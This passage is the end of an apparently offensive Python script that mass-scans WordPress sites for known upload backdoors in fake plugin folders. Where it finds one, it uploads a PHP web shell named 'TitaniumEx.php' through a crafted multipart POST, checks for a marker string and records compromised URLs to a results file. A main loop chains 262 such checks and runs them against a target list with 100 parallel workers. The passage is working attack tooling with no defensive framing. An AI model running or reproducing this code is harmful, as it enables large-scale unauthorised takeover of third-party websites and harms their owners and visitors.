            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X259(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpresss3cll-2/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X260(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpress3cll-2/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X261(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpress3cll-2/up.php"
        upload_dir = url +"/wp-content/plugins/wordpress3cll-2/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X262(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpresss3cll-2/up.php"
        upload_dir = url +"/wp-content/plugins/wordpresss3cll-2/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass

def main(url):
    try:
        url = URLdomain(url)
        X(url);X2(url);X3(url);X4(url);X5(url);X6(url);X7(url);X8(url);X9(url);X10(url);X11(url);X20(url)
        X12(url);X21(url);X22(url);X23(url);X24(url);X25(url);X26(url);X27(url);X28(url);X29(url);X30(url)
        X13(url);X31(url);X32(url);X33(url);X34(url);X35(url);X36(url);X37(url);X38(url);X39(url);X40(url)
        X14(url);X41(url);X42(url);X43(url);X44(url);X45(url);X46(url);X47(url);X48(url);X49(url);X50(url)
        X15(url);X51(url);X52(url);X53(url);X54(url);X55(url);X56(url);X57(url);X58(url);X59(url);X60(url)
        X16(url);X61(url);X62(url);X63(url);X64(url);X65(url);X66(url);X67(url);X68(url);X69(url);X70(url)
        X17(url);X71(url);X72(url);X73(url);X74(url);X75(url);X76(url);X77(url);X78(url);X79(url);X80(url)
        X18(url);X81(url);X82(url);X83(url);X84(url);X85(url);X86(url);X87(url);X88(url);X89(url);X90(url)
        X19(url);X91(url);X92(url);X93(url);X94(url);X95(url);X96(url);X97(url);X98(url);X99(url);X100(url)
        X101(url);X102(url);X103(url);X104(url);X105(url);X106(url);X107(url);X108(url);X109(url);X110(url)
        X111(url);X112(url);X113(url);X114(url);X115(url);X116(url);X117(url);X118(url);X119(url);X120(url)
        X121(url);X122(url);X123(url);X124(url);X125(url);X126(url);X127(url);X128(url);X129(url);X130(url)
        X131(url);X132(url);X133(url);X134(url);X135(url);X136(url);X137(url);X138(url);X139(url);X140(url)
        X141(url);X142(url);X143(url);X144(url);X145(url);X146(url);X147(url);X148(url);X149(url);X150(url)
        X151(url);X152(url);X153(url);X154(url);X155(url);X156(url);X157(url);X158(url);X159(url);X160(url)
        X161(url);X162(url);X163(url);X164(url);X165(url);X166(url);X167(url);X168(url);X169(url);X170(url)
        X171(url);X172(url);X173(url);X174(url);X175(url);X176(url);X177(url);X178(url);X179(url);X180(url)
        X181(url);X182(url);X183(url);X184(url);X185(url);X186(url);X187(url);X188(url);X189(url);X190(url)
        X191(url);X192(url);X193(url);X194(url);X195(url);X196(url);X197(url);X198(url);X199(url);X200(url)
        X201(url);X202(url);X203(url);X204(url);X205(url);X206(url);X207(url);X208(url);X209(url);X210(url)
        X211(url);X212(url);X213(url);X214(url);X215(url);X216(url);X217(url);X218(url);X219(url);X220(url)
        X221(url);X222(url);X223(url);X224(url);X225(url);X226(url);X227(url);X228(url);X229(url);X230;(url)
        X231(url);X232(url);X233(url);X234(url);X235(url);X236(url);X237(url);X238(url);X239(url);X240(url)
        X241(url);X242(url);X243(url);X244(url);X245(url);X246(url);X247(url);X248(url);X249(url);X250(url)
        X251(url);X252(url);X253(url);X254(url);X255(url);X256(url);X257(url);X258(url);X259(url);X260(url)
        X261(url);X262(url)
    except KeyboardInterrupt:exit()
    except:
        pass

def anasayfa():
    try:
        mp = Pool(100)
        mp.map(main, target)
        mp.close()
        mp.join()
    except KeyboardInterrupt:exit()
    except:pass
anasayfa()